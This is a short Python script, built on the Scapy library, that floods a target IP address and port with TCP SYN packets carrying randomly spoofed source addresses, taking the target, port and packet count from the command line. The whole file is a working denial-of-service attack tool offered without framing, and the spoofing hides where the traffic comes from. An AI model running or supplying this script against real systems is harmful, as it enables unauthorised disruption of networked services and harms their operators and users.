from scapy.all import IP, TCP, send
import random
import argparse

def syn_flood(target_ip, target_port, packet_count):
    for _ in range(packet_count):
        ip = IP(dst=target_ip, src=".".join(str(random.randint(1, 254)) for _ in range(4)))
        tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
        packet = ip / tcp
        send(packet, verbose=False)
    print(f"[SYN FLOOD] Sent {packet_count} SYN packets to {target_ip}:{target_port}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="Target IP")
    parser.add_argument("port", type=int, help="Target Port")
    parser.add_argument("--count", type=int, default=1000, help="Number of packets to send")
    args = parser.parse_args()
    syn_flood(args.ip, args.port, args.count)